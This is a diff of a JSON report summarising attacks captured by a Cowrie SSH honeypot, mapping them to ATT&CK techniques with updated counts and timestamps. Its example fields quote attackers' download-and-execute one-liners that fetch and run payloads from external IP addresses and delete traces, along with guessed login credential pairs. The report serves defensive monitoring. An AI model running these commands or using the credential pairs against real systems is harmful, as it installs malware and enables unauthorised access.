@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-06 13:01:44",
+  "generated": "2026-09-06 14:04:36",
   "totals": {
-    "commands": 107,
-    "login_failed": 2073,
-    "login_success": 67,
-    "sessions": 2224
+    "commands": 139,
+    "login_failed": 2164,
+    "login_success": 75,
+    "sessions": 2311
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2073,
+      "count": 2164,
       "examples": [
         "root / Server@123",
         "admin / qazwsx",
@@ -21,14 +21,14 @@
         "root / server123"
       ],
       "first": "2026-09-06T00:01:48.192357Z",
-      "last": "2026-09-06T13:01:13.663382Z",
-      "unique_ips": 136
+      "last": "2026-09-06T14:04:34.485099Z",
+      "unique_ips": 148
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 67,
+      "count": 75,
       "examples": [
         "ftpuser / ftpuser",
         "support / 22222",
@@ -37,14 +37,14 @@
         "ubuntu / ubuntu"
       ],
       "first": "2026-09-06T00:08:31.210876Z",
-      "last": "2026-09-06T12:48:07.200627Z",
-      "unique_ips": 59
+      "last": "2026-09-06T14:01:44.880397Z",
+      "unique_ips": 67
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 37,
+      "count": 52,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +53,14 @@
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T08:14:43.054740Z",
-      "unique_ips": 6
+      "last": "2026-09-06T14:00:39.619028Z",
+      "unique_ips": 7
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 18,
+      "count": 22,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -69,8 +69,8 @@
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi"
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T08:14:43.449647Z",
-      "unique_ips": 6
+      "last": "2026-09-06T14:00:39.619028Z",
+      "unique_ips": 7
     },
     {
       "id": "T1082",
@@ -106,14 +106,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-06T03:22:52.847139Z",
-      "last": "2026-09-06T06:52:04.026977Z",
-      "unique_ips": 3
+      "last": "2026-09-06T14:00:04.397178Z",
+      "unique_ips": 4
     },
     {
       "id": "T1070.004",
@@ -174,19 +174,39 @@
       16
     ],
     [
+      "/bin/busybox",
+      9
+    ],
+    [
       "shell",
-      5
+      6
     ],
     [
       "sh",
-      4
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
-      4
+      5
     ],
     [
       "linuxshell",
+      4
+    ],
+    [
+      "enable",
+      3
+    ],
+    [
+      "system",
+      3
+    ],
+    [
+      "enablelinuxshell",
+      3
+    ],
+    [
+      "ping ;sh",
       3
     ],
     [
@@ -195,26 +215,6 @@
     ],
     [
       "/bin/busybox TOKEN",
-      2
-    ],
-    [
-      "/bin/busybox",
-      2
-    ],
-    [
-      "enable",
-      2
-    ],
-    [
-      "system",
-      2
-    ],
-    [
-      "enablelinuxshell",
-      2
-    ],
-    [
-      "ping ;sh",
       2
     ],
     [
